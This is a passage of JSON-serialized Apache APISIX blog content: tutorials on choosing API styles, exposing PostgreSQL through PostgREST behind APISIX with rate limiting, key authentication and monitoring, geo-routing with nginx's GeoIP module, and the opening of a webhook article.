tunnel-style (RPC) implementation and is well-suited for distributed systems. It has SDKs for many languages and platforms, so it can be used widely, for communication across platforms and languages. gRPC is super fast and efficient because it uses [Protocol Buffers](https://en.wikipedia.org/wiki/Protocol_Buffers) (protobufs) to serialize and deserialize, the HTTP/2 standard for optimized binary transfers,  and bidirectional streaming to avoid (long) polling and blocking HTTP calls.\\n\\nTools can be used to expose procedures as APIs, in which case a lot of the task of \u201ccreating the API\u201d can be automated. There still should be some management layer for securing the APIs, but that can be addressed by using a component such as an API gateway and its [gRPC proxying](https://apisix.apache.org/blog/2021/12/30/apisix-proxy-grpc-service/) ability to convert payloads from one format to another over the same transport (from REST to gRPC or vice versa) if different API protocols are used in the system.\\n\\n## Event-Based Style\\n\\nIn the _event-based style_, the API provider creates events that are then delivered to consumers of the API instead of consumers requesting something from the provider. Consuming applications expect to be informed of any change of state on a specific record or records on API. There are many ways and technology options to consider when implementing an event-driven API. For example, we explored [how to build Event-Driven APIs with Webhook and API Gateway](https://apisix.apache.org/blog/2022/11/07/webhook-api-gateway-event-driven-apis/) in this post.\\n\\n![Event-Based API Style](https://static.apiseven.com/2022/12/06/638e31d5902df.png)\\n\\nAnother approach is that event consumers connect to a _message broker_ that decouples them from event producers. The message broker takes care of managing events, and consumers must subscribe to certain event types so that the broker can make sure that events of this type are delivered to subscribers. In this case, the architecture is much more centered around the delivery broker, and all event producers and consumers are connected to this message broker. In this case, a good technology to consider can be [Kafka](https://kafka.apache.org/) which is Kafka is highly scalable and resilient.\\n\\nSome drawbacks of choosing an event-based style are, it takes more time to implement compared to other styles, it may trigger multiple duplicate messages across different services if the style is not properly applied, error handling and troubleshooting can be challenging without installing & configuring third-party tools to monitor the event flow effectively. However, you can put the API Gateway in front of even-driven APIs when [observing modern applications](https://dev.to/apisix/apis-observability-with-apache-apisix-plugins-1bnm) with its simple built-in integration to several monitoring platforms.\\n\\n## Wrapping Up\\n\\nAs we reviewed,  5 styles were the foundation of popular approaches and technologies such as [REST](https://en.wikipedia.org/wiki/Representational_state_transfer), [OpenAPI](https://www.openapis.org/), [HTTP](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol), [gRPC](https://grpc.io/), [GraphQL](https://graphql.org/), and [Kafka](https://kafka.apache.org/). The most important lesson to learn about these **5 API styles** is that there is no \u201cbest style\u201d. When it comes to choosing an API style, it all boils down to the **following 3 classes**: _a problem, consumers, and context_.\\n\\n**Problem** - As discussed in the individual styles, each style has a certain focus and certain strengths. Thus, it is important to think about the problem that is addressed with an API.\\n\\n**Consumer** - Every API is built for consumption, and thus an API\u2019s consumers always should be an important design aspect. Since APIs ideally are reused, it\u2019s not always possible to plan for all consumers and their constraints, but it makes sense to design with at least some consumers in mind and to make assumptions about others.\\n\\n**Context** - Most APIs are part of an API landscape. That landscape can have a different audience and scope, depending on whether the API is meant for internal, partner, or public use.\\n\\nUltimately, the style that you and your team are more familiar with and easier to build might be a good fit for your project. Sometimes, we need to use different styles together in one software project.  \\n\\n### Related resources\\n\\n- [API fundamentals](https://developer.ibm.com/articles/api-fundamentals/).\\n\\n- [API Styles: SOAP, REST, RPC, GraphQL and more](https://api-university.com/blog/styles-for-apis-soap-rest-and-rpc/).\\n\\n### Recommended content\\n\\n- [How to build Event-Driven APIs with Webhook and API Gateway](https://apisix.apache.org/blog/2022/11/07/webhook-api-gateway-event-driven-apis/)\\n\\n- [10 most common use cases of an API Gateway](https://apisix.apache.org/blog/2022/10/27/ten-use-cases-api-gateway/).\\n\\n- [How to choose the right API Gateway](https://iambobur.com/2022/11/22/how-to-choose-the-right-api-gateway/).\\n\\n- [A poor man\'s API](https://apisix.apache.org/blog/2022/11/23/poor-man-api/)."},{"id":"A poor man\'s API","metadata":{"permalink":"/blog/2022/11/23/poor-man-api","source":"@site/blog/2022/11/23/poor-man-api.md","title":"A poor man\'s API","description":"Creating a full-fledged API requires resources, both time and money. You need to think about the model, the design, the REST principles, etc., without writing a single line of code. Most of the time, you don\'t know whether it\'s worth it: you\'d like to offer a Minimum Viable Product and iterate from there. I want to show how you can achieve it without writing a single line of code.","date":"2022-11-23T00:00:00.000Z","formattedDate":"November 23, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.985,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"How to choose the right API Style and Technology","permalink":"/blog/2022/12/06/choose-the-right-api-style-technology"},"nextItem":{"title":"Geo-routing with Apache APISIX","permalink":"/blog/2022/11/09/georouting-apisix"}},"content":"> Creating a full-fledged API requires resources, both time and money. You need to think about the model, the design, the REST principles, etc., without writing a single line of code. Most of the time, you don\'t know whether it\'s worth it: you\'d like to offer a Minimum Viable Product and iterate from there. I want to show how you can achieve it without writing a single line of code.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/poor-man-api/\\" />\\n</head>\\n\\n## The solution\\n\\nThe main requirement of the solution is to use the [PostgreSQL database](https://www.postgresql.org/). It\'s a well-established Open Source SQL database.\\n\\nInstead of writing our REST API, we use the PostgREST component:\\n\\n>PostgREST is a standalone web server that turns your PostgreSQL database directly into a RESTful API. The structural constraints and permissions in the database determine the API endpoints and operations.\\n>\\n>-- [PostgREST](https://postgrest.org/)\\n\\nLet\'s apply it to a simple use case. Here\'s a `product` table that I want to expose via a CRUD API:\\n\\n![Product table](https://blog.frankel.ch/assets/generated/poor-man-api/table.svg)\\n\\nNote that you can find the whole source code on [GitHub](https://github.com/ajavageek/poor-man-api) to follow along.\\n\\nPostgREST\'s [Getting Started guide](https://postgrest.org/en/stable/tutorials/tut0.html) is pretty complete and works out of the box. Yet, I didn\'t find any ready-made Docker image, so I created my own:\\n\\n```dockerfile\\nFROM debian:bookworm-slim                                                   #1\\n\\nARG POSTGREST_VERSION=v10.1.1                                               #2\\nARG POSTGREST_FILE=postgrest-$POSTGREST_VERSION-linux-static-x64.tar.xz     #2\\n\\nRUN mkdir postgrest\\n\\nWORKDIR postgrest\\n\\nADD https://github.com/PostgREST/postgrest/releases/download/$POSTGREST_VERSION/$POSTGREST_FILE \\\\\\n    .                                                                       #3\\n\\nRUN apt-get update && \\\\\\n    apt-get install -y libpq-dev xz-utils && \\\\\\n    tar xvf $POSTGREST_FILE && \\\\\\n    rm $POSTGREST_FILE                                                      #4\\n```\\n\\n1. Start from the latest Debian\\n2. Parameterize the build\\n3. Get the archive\\n4. Install dependencies and unarchive\\n\\nThe Docker image contains a `postgrest` executable in the `/postgrest` folder. We can \\"deploy\\" the architecture via Docker Compose:\\n\\n```yaml\\nversion: \\"3\\"\\nservices:\\n  postgrest:\\n    build: ./postgrest                                   #1\\n    volumes:\\n      - ./postgrest/product.conf:/etc/product.conf:ro    #2\\n    ports:\\n      - \\"3000:3000\\"\\n    entrypoint: [\\"/postgrest/postgrest\\"]                 #3\\n    command: [\\"/etc/product.conf\\"]                       #4\\n    depends_on:\\n      - postgres\\n  postgres:\\n    image: postgres:15-alpine\\n    environment:\\n      POSTGRES_PASSWORD: \\"root\\"\\n    volumes:\\n      - ./postgres:/docker-entrypoint-initdb.d:ro       #5\\n```\\n\\n1. Build the above `Dockerfile`\\n2. Share the configuration file\\n3. Run the `postgrest` executable\\n4. With the configuration file\\n5. Initialize the schema, the permissions, and the data\\n\\nAt this point, we can query the `product` table:\\n\\n```bash\\ncurl localhost:3000/product\\n```\\n\\nWe immediately get the results:\\n\\n```json\\n[{\\"id\\":1,\\"name\\":\\"Stickers pack\\",\\"description\\":\\"A pack of rad stickers to display on your laptop or wherever you feel like. Show your love for Apache APISIX\\",\\"price\\":0.49,\\"hero\\":false},\\n {\\"id\\":2,\\"name\\":\\"Lapel pin\\",\\"description\\":\\"With this \\\\\\"Powered by Apache APISIX\\\\\\" lapel pin, support your favorite API Gateway and let everybody know about it.\\",\\"price\\":1.49,\\"hero\\":false},\\n {\\"id\\":3,\\"name\\":\\"Tee-Shirt\\",\\"description\\":\\"The classic geek product! At a conference, at home, at work, this tee-shirt will be your best friend.\\",\\"price\\":9.99,\\"hero\\":true}]\\n```\\n\\nThat was a quick win!\\n\\n## Improving the solution\\n\\nThough the solution works, it has a lot of room for improvement. For example, the database user cannot change the data, but everybody can actually access it. It might not be a big issue for product-related data, but what about medical data?\\n\\nThe PostgREST documentation is aware of it and explicitly advises using a reverse proxy:\\n\\n>PostgREST is a fast way to construct a RESTful API. Its default behavior is great for scaffolding in development. When it\u2019s time to go to production it works great too, as long as you take precautions. PostgREST is a small sharp tool that focuses on performing the API-to-database mapping. We rely on a reverse proxy like Nginx for additional safeguards.\\n>\\n>-- [Hardening PostgREST](https://postgrest.org/en/stable/admin.html)\\n\\nInstead of nginx, we would benefit from a full-fledged API Gateway: enters [Apache APISIX](https://apisix.apache.org/). We shall add it to our Docker Compose:\\n\\n```yaml\\nversion: \\"3\\"\\nservices:\\n  apisix:\\n    image: apache/apisix:2.15.0-alpine                              #1\\n    volumes:\\n      - ./apisix/config.yml:/usr/local/apisix/conf/config.yaml:ro\\n    ports:\\n      - \\"9080:9080\\"\\n    restart: always\\n    depends_on:\\n      - etcd\\n      - postgrest\\n  etcd:\\n    image: bitnami/etcd:3.5.2                                       #2\\n    environment:\\n      ETCD_ENABLE_V2: \\"true\\"\\n      ALLOW_NONE_AUTHENTICATION: \\"yes\\"\\n      ETCD_ADVERTISE_CLIENT_URLS: \\"http://0.0.0.0:2397\\"\\n      ETCD_LISTEN_CLIENT_URLS: \\"http://0.0.0.0:2397\\"\\n```\\n\\n1. Use Apache APISIX\\n2. APISIX stores its configuration in [etcd](https://etcd.io/)\\n\\nWe shall first configure Apache APISIX to proxy calls to `postgrest`:\\n\\n```bash\\ncurl http://apisix:9080/apisix/admin/upstreams/1 -H \'X-API-KEY: 123xyz\' -X PUT -d \' #1-2\\n{\\n  \\"type\\": \\"roundrobin\\",\\n  \\"nodes\\": {\\n    \\"postgrest:3000\\": 1                                                             #1-3\\n  }\\n}\'\\n\\ncurl http://apisix:9080/apisix/admin/routes/1 -H \'X-API-KEY: 123xyz\' -X PUT -d \'    #4\\n{\\n  \\"uri\\": \\"/*\\",\\n  \\"upstream_id\\": 1\\n}\'\\n```\\n\\n1. Should be run in one of the Docker nodes, so use the Docker image\'s name. Alternatively, use `localhost` but be sure to expose the ports\\n2. Create a reusable _upstream_\\n3. Point to the PostgREST node\\n4. Create a _route_ to the created _upstream_\\n\\nWe can now query the endpoint via APISIX:\\n\\n```bash\\ncurl localhost:9080/product\\n```\\n\\nIt returns the same result as above.\\n\\n## DDoS protection\\n\\nWe haven\'t added anything, but we\'re ready to start the work. Let\'s first protect our API from <abbr title=\\"Distributed Denial of Service\\">DDoS</abbr> attacks. Apache APISIX is designed around a plugin architecture. To protect from DDoS, we shall use a plugin. We can set plugins on a specific _route_ when it\'s created or on every _route_; in the latter case, it\'s a _global rule_. We want to protect every route by default, so we shall use one.\\n\\n```bash\\ncurl http://apisix:9080/apisix/admin/global_rules/1 -H \'X-API-KEY: 123xyz\' -X PUT -d \'\\n{\\n  \\"plugins\\": {\\n    \\"limit-count\\": {                 #1\\n      \\"count\\": 1,                    #2\\n      \\"time_window\\": 5,              #2\\n      \\"rejected_code\\": 429           #3\\n    }\\n  }\\n}\'\\n```\\n\\n1. `limit-count` limits the number of calls in a time window\\n2. Limit to 1 call per 5 seconds; it\'s for demo purposes\\n3. Return `429 Too Many Requests`; the default is `503`\\n\\nNow, if we execute too many requests, Apache APISIX protects the upstream:\\n\\n```bash\\ncurl localhost:9080/product\\n```\\n\\n```html\\n<html>\\n<head><title>429 Too Many Requests</title></head>\\n<body>\\n<center><h1>429 Too Many Requests</h1></center>\\n<hr><center>openresty</center>\\n</body>\\n</html>\\n```\\n\\n## Per-route authorization\\n\\nPostgREST also offers an Open API endpoint at the root. We thus have two routes: `/` for the Open API spec and `/product` for the products. Suppose we want to disallow unauthorized people to access our data: Regular users can access products, while admin users can access both the Open API spec **and** products.\\n\\nAPISIX offers several [authentication methods](https://apisix.apache.org/plugins/#authentication). We will use the simplest one possible, [key-auth](https://apisix.apache.org/docs/apisix/plugins/key-auth/). It relies on the [Consumer](https://apisix.apache.org/docs/apisix/terminology/consumer/) abstraction. `key-auth` requires a specific header: the plugin does a reverse lookup on the value and finds the consumer whose key corresponds.\\n\\nHere\'s how to create a consumer:\\n\\n```bash\\ncurl http://apisix:9080/apisix/admin/consumers -H \'X-API-KEY: 123xyz\' -X PUT -d \'    #1\\n{\\n  \\"username\\": \\"admin\\",                                                               #2\\n  \\"plugins\\": {\\n    \\"key-auth\\": {\\n      \\"key\\": \\"admin\\"                                                                 #3\\n    }\\n  }\\n}\'\\n```\\n\\n1. Create a new consumer\\n2. Consumer\'s name\\n3. Consumer\'s key value\\n\\nWe do the same with consumer `user` and key `user`. Now, we can create a dedicated route and configure it so that only requests from `admin` pass through:\\n\\n```bash\\ncurl http://apisix:9080/apisix/admin/routes -H \'X-API-KEY: 123xyz\' -X POST -d \' #1\\n{\\n  \\"uri\\": \\"/\\",\\n  \\"upstream_id\\": 1,\\n  \\"plugins\\": {\\n    \\"key-auth\\": {},                                                             #2\\n    \\"consumer-restriction\\": {                                                   #2\\n      \\"whitelist\\": [ \\"admin\\" ]                                                  #3\\n    }\\n  }\\n}\'\\n```\\n\\n1. Create a new route\\n2. Use the `key-auth` and `consumer-restriction` plugins\\n3. Only `admin`-authenticated requests can call the route\\n\\nLet\'s try the following:\\n\\n```bash\\ncurl localhost:9080\\n```\\n\\nIt doesn\'t work as we are not authenticated via an API key header.\\n\\n```json\\n{\\"message\\":\\"Missing API key found in request\\"}\\n```\\n\\n```bash\\ncurl -H \\"apikey: user\\" localhost:9080\\n```\\n\\nIt doesn\'t work as we are authenticated as `user`, but the route is not authorized for `user` but for `admin`.\\n\\n```json\\n{\\"message\\":\\"The consumer_name is forbidden.\\"}\\n```\\n\\n```bash\\ncurl -H \\"apikey: admin\\" localhost:9080\\n```\\n\\nThis time, it returns the Open API spec as expected.\\n\\n## Monitoring\\n\\nA much-undervalued feature of any software system is monitoring. As soon as you deploy any component in production, you must monitor its health. Nowadays, many services are available to monitor. We will use [Prometheus](https://prometheus.io/) as it\'s Open Source, battle-proven, and widespread. To display the data, we will rely on [Grafana](https://grafana.com/) for the same reasons. Let\'s add the components to the Docker Compose file:\\n\\n```yaml\\nversion: \\"3\\"\\nservices:\\n  prometheus:\\n    image: prom/prometheus:v2.40.1                                    #1\\n    volumes:\\n      - ./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml    #2\\n    depends_on:\\n      - apisix\\n  grafana:\\n    image: grafana/grafana:8.5.15                                     #3\\n    volumes:\\n      - ./grafana/provisioning:/etc/grafana/provisioning              #4\\n      - ./grafana/dashboards:/var/lib/grafana/dashboards              #4\\n      - ./grafana/config/grafana.ini:/etc/grafana/grafana.ini         #4-5\\n    ports:\\n      - \\"3001:3001\\"\\n    depends_on:\\n      - prometheus\\n```\\n\\n1. Prometheus image\\n2. Prometheus configuration to scrape Apache APISIX. See the full file [here](https://github.com/ajavageek/poor-man-api/blob/master/prometheus/prometheus.yml)\\n3. Grafana image\\n4. Grafana configuration. Most of it comes from the configuration [provided](https://github.com/apache/apisix/blob/master/docs/assets/other/json/apisix-grafana-dashboard.json) by APISIX.\\n5. Change the default port from `3000` to `3001` to avoid conflict with the PostgREST service\\n\\nOnce the monitoring infrastructure is in place, we only need to instruct APISIX to provide the data in a format that Prometheus expects. We can achieve it through configuration and a new global rule:\\n\\n```yaml\\nplugin_attr:\\n  prometheus:\\n    export_addr:\\n      ip: \\"0.0.0.0\\"             #1\\n      port: 9091                #2\\n```\\n\\n1. Bind to any address\\n2. Bind to port `9091`. Prometheus metrics are available on `http://apisix:9091/apisix/prometheus/metrics` on the Docker network\\n\\nWe can create the global rule:\\n\\n```bash\\ncurl http://apisix:9080/apisix/admin/global_rules/2 -H \'X-API-KEY: 123xyz\' -X PUT -d \'\\n{\\n  \\"plugins\\": {\\n    \\"prometheus\\": {}\\n  }\\n}\'\\n```\\n\\nSend a couple of queries and open the Grafana dashboard. It should look similar to this:\\n\\n![Grafana dashboard](https://static.apiseven.com/uploads/2023/06/08/VU9tQ69R_grafana.jpeg)\\n\\n## Conclusion\\n\\nCreating a full-fledged REST(ful) API is a huge investment. One can quickly test a simple API by exposing one\'s database in a CRUD API via PostgREST. However, such an architecture is not fit for production usage.\\n\\nTo fix it, you need to set a fa\xe7ade in front of PostgREST, a reverse proxy, or even better, an API Gateway. Apache APISIX offers a wide range of features, from authorization to monitoring. With it, you can quickly validate your API requirements at a low cost.\\n\\nThe icing on the cake: when you\'ve validated the requirements, you can keep the existing fa\xe7ade and replace PostgREST with your custom-developed API.\\n\\nThe source code is available on [GitHub](https://github.com/ajavageek/poor-man-api).\\n\\n**To go further:**\\n\\n* [PostgREST](https://postgrest.org/)\\n* [Getting started with Apache APISIX](https://apisix.apache.org/docs/apisix/getting-started/)\\n* [Apache APISIX plugins](https://apisix.apache.org/plugins/)"},{"id":"Geo-routing with Apache APISIX","metadata":{"permalink":"/blog/2022/11/09/georouting-apisix","source":"@site/blog/2022/11/09/georouting-apisix.md","title":"Geo-routing with Apache APISIX","description":"Apache APISIX, the Apache-led API Gateway, comes out of the box with many plugins to implement your use case. Sometimes, however, the plugin you\'re looking for is not available. While creating your own is always possible, it\'s sometimes necessary. Today, I\'ll show you how to route users according to their location without writing a single line of Lua code.","date":"2022-11-09T00:00:00.000Z","formattedDate":"November 9, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.595,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"A poor man\'s API","permalink":"/blog/2022/11/23/poor-man-api"},"nextItem":{"title":"Event-Driven APIs with Webhook and API Gateway","permalink":"/blog/2022/11/07/webhook-api-gateway-event-driven-apis"}},"content":"> Apache APISIX, the Apache-led API Gateway, comes out of the box with many plugins to implement your use case. Sometimes, however, the plugin you\'re looking for is not available. While creating your own is always possible, it\'s sometimes necessary. Today, I\'ll show you how to route users according to their location without writing a single line of Lua code.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/georouting-apisix/\\" />\\n</head>\\n\\n## Why geo-routing?\\n\\nGeo-routing is to forward HTTP requests based on a user\'s physical location, inferred from their IP. There are many reasons to do that, and here is a couple of them.\\n\\nNote that I\'ll use the country as the location-dependent factor, but any smaller or bigger scale works. It\'s the scale I\'m most familiar with - and probably the most useful.\\n\\nFirst, most applications are not meant to be geo-dependent. The app your team has just developed probably only makes sense in a single country, if not a single region. In this case, geo-routing will never be a problem.\\n\\nHowever, some apps do grow along with the business. When it happens, the need for [internationalization and localization](https://en.wikipedia.org/wiki/Internationalization_and_localization) appears. It\'s the app\'s responsibility to handle such geo-dependent factors. <abbr title=\\"internationalization\\">i18n</abbr> should be handled natively by the tech stack, _e.g._, in [Java](https://docs.oracle.com/javase/8/docs/technotes/guides/intl/index.html). <abbr title=\\"localization\\">l10n</abbr> is more _ad hoc_ but shouldn\'t be a problem either.\\n\\nIssues arise when business rules diverge from country to country, chiefly because of laws. Other reasons include a partnership. Imagine an e-commerce shop that has branches in many countries. You may choose the delivery partner, but depending on the country, available partners are different. While keeping a single codebase is always a wise choice, even the best design can only slow down the chaos from many business rules. At one point, splitting the God app into multiple country-dependent apps is inevitable.\\n\\nSometimes, you don\'t even have a choice. A country decides you have to store your database on their territory, so you cannot share it anymore and have to split both storage and app. I witnessed it first-hand with Russia in 2015: we had to deploy a custom version of our e-commerce application just for Russia.\\n\\nFinally, you may also want to deploy a new app version for a single country only. In this case, you should monitor not (only) technical metrics but business ones over time. Then you\'ll decide whether to expand the new version to other countries based on them or work more on the latest version before deploying further.\\n\\n## Setting up Apache APISIX for geo-routing\\n\\nThough I\'m a developer by trade (and passion!), I\'m pragmatic. I\'m convinced that every line of code I don\'t write is a line I don\'t need to maintain. Apache APISIX doesn\'t offer geo-routing, but it\'s built on top of Nginx. The latter provides a [geo-routing](http://nginx.org/en/docs/http/ngx_http_geoip_module.html) feature, albeit not by default.\\n\\nThe following instructions are based on Docker to allow everybody to follow them regardless of their platform.\\n\\nWe need several steps to set up geo-routing on Apache APISIX:\\n\\n1. Create a custom Docker image\\n    * Add the required library module\\n    * Add its dependencies\\n2. Configure Apache APISIX\\n3. Enjoy!\\n\\nNginx geo-routing requires the `ngx_http_geoip_module` module. But if we try to install it via a package manager, it also installs `nginx`, which conflicts with the `nginx` instance embedded in Apache APISIX. As we only need the library, we can get it from the relevant Docker image:\\n\\n```Dockerfile\\nFROM nginx:1.21.4 as geoiplib\\n\\nFROM apache/apisix:2.15.0-debian\\n\\nCOPY --from=geoiplib /usr/lib/nginx/modules/ngx_http_geoip_module.so \\\\      #1\\n                     /usr/local/apisix/modules/ngx_http_geoip_module.so\\n```\\n\\nCopy the library from the `nginx` image to the `apache/apisix` one\\n\\nThe regular package install installs all the dependencies, even the ones we don\'t want. Because we only copy the library, we need to install the dependencies manually. It\'s straightforward:\\n\\n```Dockerfile\\nRUN apt-get update \\\\\\n && apt-get install -y libgeoip1\\n```\\n\\nNginx offers two ways to activate a module: via the command line or dynamically in the `nginx.conf` configuration file. The former is impossible since we\'re not in control, so the latter is our only option. To update the Nginx config file with the module at startup time, Apache APISIX offers a hook in its config file:\\n\\n```yaml\\nnginx_config:\\n  main_configuration_snippet: |\\n    load_module     \\"modules/ngx_http_geoip_module.so\\";\\n```\\n\\nThe above will generate the following:\\n\\n```\\n# Configuration File - Nginx Server Configs\\n# This is a read-only file, do not try to modify it.\\nmaster_process on;\\n\\nworker_processes auto;\\nworker_cpu_affinity auto;\\n\\n# main configuration snippet starts\\nload_module     \\"modules/ngx_http_geoip_module.so\\";\\n\\n...\\n```\\n\\nThe [GeoIP module](http://nginx.org/en/docs/http/ngx_http_geoip_module.html) relies on the [Maxmind GeoIP database](https://dev.maxmind.com/geoip/geolite2-free-geolocation-data). We installed it implicitly in the previous step; we have to configure the module to point to it:\\n\\n```yaml\\nnginx_config:\\n  http_configuration_snippet: |\\n    geoip_country   /usr/share/GeoIP/GeoIP.dat;\\n```\\n\\nFrom this point on, every request going through Apache APISIX is geo-located. It translates as Nginx adding additional variables. As per the documentation:\\n\\n>The following variables are available when using this database:\\n>\\n>`$geoip_country_code`\\n> two-letter country code, for example, `\\"RU\\"`, `\\"US\\"`.\\n>`$geoip_country_code3`\\n> three-letter country code, for example, `\\"RUS\\"`, `\\"USA\\"`.\\n>`$geoip_country_name`\\n> country name, for example, `\\"Russian Federation\\"`, `\\"United States\\"`.\\n>\\n> -- [Module ngx_http_geoip_module](http://nginx.org/en/docs/http/ngx_http_geoip_module.html)\\n\\n## Testing geo-routing\\n\\nYou may believe that the above works - and it does, but I\'d like to prove it.\\n\\nI\'ve created a [dedicated project](https://github.com/ajavageek/apisix-georouting) whose architecture is simple:\\n\\n* Apache APISIX configured as above\\n* Two upstreams, one in English and one in French\\n\\n```yaml\\nupstreams:\\n  - id: 1\\n    type: roundrobin\\n    nodes:\\n      \\"english:8082\\": 1\\n  - id: 2\\n    type: roundrobin\\n    nodes:\\n      \\"french:8081\\": 1\\nroutes:\\n  - uri: /\\n    upstream_id: 1\\n  - uri: /\\n    upstream_id: 2\\n#END\\n```\\n\\nWith this snippet, every user accesses the English upstream. I intend to direct users located in France to the French upstream and the rest to the English one. For this, we need to configure the second route:\\n\\n```yaml\\nroutes:\\n  - uri: /\\n    upstream_id: 2\\n    vars: [[\\"geoip_country_code\\", \\"==\\", \\"FR\\"]]   #1\\n    priority: 5                                  #2\\n```\\n\\n1. The magic happens here; see below.\\n2. By default, route matching rules are evaluated in arbitrary order. We need this rule to be evaluated first. So we increase the priority - the default is 10.\\n\\nMost Apache APISIX users are used to matching on routes, methods, and domains, but there\'s [more to it](https://apisix.apache.org/docs/apisix/admin-api/#uri-request-parameters). One can match on Nginx variables, as shown above. In our case, the route matches if the `geoip_country_code` variable is equal to `\\"FR\\"`.\\n\\nNote that `vars` values readability over power. Use the `filter_func(vars)` attribute if you need more complex logic.\\n\\nWe can still not test our feature at this point, as we would need to change our IP address. Fortunately, it\'s possible to cheat (a bit), and the cheat is helpful in other scenarios. Imagine that Apache APISIX is not directly exposed to the Internet but sits behind a reverse proxy. There might be multiple reasons for this: \\"history\\", a single RP pointing to multiple gateways under the responsibility of different teams, etc.\\n\\nIn this case, the client IP would be the RP\'s proxy. To propagate the original client IP, the agreed-upon method is to add an `X-Forwarded-For` request HTTP header:\\n\\n>The X-Forwarded-For (XFF) request header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server.\\n>\\n>When a client connects directly to a server, the client\'s IP address is sent to the server (and is often written to server access logs). But if a client connection passes through any forward or reverse proxies, the server only sees the final proxy\'s IP address, which is often of little use. That\'s especially true if the final proxy is a load balancer which is part of the same installation as the server. So, to provide a more-useful client IP address to the server, the `X-Forwarded-For` request header is used.\\n>\\n> -- [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)\\n\\nThe Nginx module offers this configuration but restricts it to an IP range. For testing, we configure it to _any_ IP; in production, we should set it to the RP IP.\\n\\n```yaml\\nnginx_config:\\n  http:\\n    geoip_proxy     0.0.0.0/0;\\n```\\n\\nWe can finally test the setup:\\n\\n```bash\\ncurl localhost:9080\\n```\\n\\n```\\n{\\n  \\"lang\\": \\"en\\",\\n  \\"message\\": \\"Welcome to Apache APISIX\\"\\n}\\n```\\n\\n```bash\\ncurl -H \\"X-Forwarded-For: 212.27.48.10\\" localhost:9080    #1\\n```\\n\\n1. `212.27.48.10` is a French IP address\\n\\n```\\n{\\n  \\"lang\\": \\"fr\\",\\n  \\"message\\": \\"Bienvenue \xe0 Apache APISIX\\"\\n}\\n```\\n\\n## Bonus: logs and monitoring\\n\\nIt\'s straightforward to use the new variable in the Apisix logs. I\'d advise it for two reasons:\\n\\n* At the beginning to make sure everything is ok\\n* In the long run, to monitor traffic, _e.g._, send it to Elasticsearch and display it on a Kibana dashboard\\n\\nJust configure it accordingly:\\n\\n```yaml\\nnginx_config:\\n  http:\\n    access_log_format: \\"$remote_addr - $remote_user [$time_local][$geoip_country_code] $http_host \\\\\\"$request\\\\\\" $status $body_bytes_sent $request_time \\\\\\"$http_referer\\\\\\" \\\\\\"$http_user_agent\\\\\\" $upstream_addr $upstream_status $upstream_response_time\\"\\n```\\n\\nKeep the default log variables and add the country code\\n\\n## Conclusion\\n\\nGeo-routing is a requirement for successful apps and businesses. Apache APISIX doesn\'t provide it out-of-the-box. In this post, I showed how it could still be straightforward to set it up using the power of Nginx.\\n\\nYou can find the source code for this post on GitHub.\\n\\n**To go further:**\\n\\n* [Module ngx_http_geoip_module](http://nginx.org/en/docs/http/ngx_http_geoip_module.html)\\n* [Converting Static Modules to Dynamic Modules](https://www.nginx.com/resources/wiki/extending/converting/)\\n* [Customize Nginx configuration](https://apisix.apache.org/docs/apisix/customize-nginx-configuration/)\\n* [GeoIP Update](https://github.com/maxmind/geoipupdate)"},{"id":"Event-Driven APIs with Webhook and API Gateway","metadata":{"permalink":"/blog/2022/11/07/webhook-api-gateway-event-driven-apis","source":"@site/blog/2022/11/07/webhook-api-gateway-event-driven-apis.md","title":"Event-Driven APIs with Webhook and API Gateway","description":"This post elaborates on building event-driven APIs by making use of Webhook and API Gateway, we understand the role of each in this solution.","date":"2022-11-07T00:00:00.000Z","formattedDate":"November 7, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.8,"truncated":true,"authors":[{"name":"Bobur Umurzokov","title":"Author","url":"https://github.com/Boburmirzo","image_url":"https://avatars.githubusercontent.com/u/14247607","imageURL":"https://avatars.githubusercontent.com/u/14247607"}],"prevItem":{"title":"Geo-routing with Apache APISIX","permalink":"/blog/2022/11/09/georouting-apisix"},"nextItem":{"title":"Apache APISIX 3.0: 11 Highlights of Open Source API Gateway","permalink":"/blog/2022/11/02/apache-apisix-v3-preview"}},"content":"> There are many ways and technology options to consider when implementing an event-driven API. For example, we explored how to [build event-driven APIs using these 3 well-known patterns](https://dev.to/apisix/building-event-driven-api-services-using-cqrs-api-gateway-and-serverless-af4): [CQRS](https://learn.microsoft.com/en-us/azure/architecture/patterns/cqrs), [API Gateway](https://apisix.apache.org/docs/apisix/terminology/api-gateway/) and [Serverless](https://learn.microsoft.com/en-us/dotnet/architecture/serverless/serverless-architecture) on the previous blog post. This post elaborates on **building event-driven APIs by making use of Webhook and API Gateway**, we understand the role of each in this solution. Firstly, let\u2019s turn our attention to the initial problem statement without the webhook in place.\\n\\n\x3c!--truncate--\x3e\\n\\n## Need for a webhook\\n\\nConsuming applications expect to be informed of any change of state on a specific record or records.\\n\\nExamples:\\n\\n- Updating or adding customers in a CRM system triggers an event.\\n- Currency exchange rates from a foreign exchange application informs users about currency change.\\n- New post on a user\'s blog notifies subscribers.\\n- New order creation on an online shopping application informs another service in the system.\\n- An orchestrator service wants to be notified when Service A completes a task and when to handover the task to Service B in a data ingestion pipeline and so on.\\n\\nThe majority of APIs only support these types of requirements by having the consuming application constantly poll for changes. This means that the consuming application has to make frequent API calls to find out any changes of state in the desired resource. This is highly inefficient, and calls may result in empty payloads when there haven\'t been any updates. Also, what if the called HTTP API accepts our HTTP request but takes a long time to handle it, this could affect the user experience, especially when the behavior is reflected 